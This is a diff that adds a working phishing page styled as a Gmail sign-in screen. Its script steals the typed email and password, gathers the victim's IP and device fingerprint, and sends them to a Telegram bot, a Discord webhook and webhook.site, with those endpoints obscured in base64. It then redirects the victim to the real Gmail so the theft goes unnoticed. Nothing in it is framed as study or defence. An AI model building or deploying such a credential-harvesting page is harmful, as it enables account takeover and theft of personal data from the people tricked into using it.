@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Gmail</title>
+  <link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    #container {
+      background-color: #1e1e1e;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+      width: 300px;
+    }
+    h2 {
+      text-align: center;
+      color: #ffffff;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      background: #2a2a2a;
+      border: 1px solid #444;
+      color: #fff;
+      border-radius: 6px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      border: none;
+      color: white;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 70px;
+    }
+  </style>
+</head>
+<body>
+  <div id="container">
+    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" class="logo">
+    <h2 id="form-title">Sign in</h2>
+    
+    <!-- Page 1: Email Input -->
+    <form id="emailForm">
+      <input type="email" id="email" placeholder="Email or phone" required />
+      <button type="submit">Next</button>
+    </form>
+
+    <!-- Page 2: Password Input -->
+    <form id="passwordForm" style="display:none;">
+      <div id="showEmail" style="margin-bottom: 10px; font-size: 14px;"></div>
+      <input type="password" id="password" placeholder="Enter your password" required />
+      <button type="submit">Next</button>
+    </form>
+  </div>
+
+  <script>
+    const telegramToken = atob("MTIzNDU2Nzg5OmFiY0RFRmdoaWprTG1ub3BRUnN0VVZ3eFla"); // Replace
+    const telegramChat = "987654321"; // Replace
+    const discordWebhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIz..."); // Replace
+    const webhookSiteURL = atob("aHR0cHM6Ly93ZWJob29rLnNpdGUvZTFiMjM0"); // Replace
+
+    let capturedEmail = "";
+
+    async function getFingerprint() {
+      const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+      return {
+        ip: ipData.ip,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}`,
+      };
+    }
+
+    document.getElementById("emailForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      capturedEmail = document.getElementById("email").value;
+      document.getElementById("emailForm").style.display = "none";
+      document.getElementById("passwordForm").style.display = "block";
+      document.getElementById("showEmail").textContent = capturedEmail;
+      document.getElementById("form-title").textContent = "Welcome";
+    });
+
+    document.getElementById("passwordForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const password = document.getElementById("password").value;
+      const fingerprint = await getFingerprint();
+
+      const message = `**Gmail Phish:**\nEmail: ${capturedEmail}\nPassword: ${password}\n\n**Victim Info:**\nIP: ${fingerprint.ip}\nDevice: ${fingerprint.platform}\nLang: ${fingerprint.language}\nTimeZone: ${fingerprint.timezone}\nScreen: ${fingerprint.screen}\nUserAgent: ${fingerprint.userAgent}`;
+
+      // Send to Telegram
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: telegramChat,
+          text: message
+        })
+      });
+
+      // Send to Discord
+      fetch(discordWebhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      });
+
+      // Send to Webhook.site
+      fetch(webhookSiteURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: capturedEmail,
+          password,
+          ...fingerprint
+        })
+      });
+
+      // Redirect to Gmail
+      setTimeout(() => {
+        window.location.href = "https://mail.google.com";
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
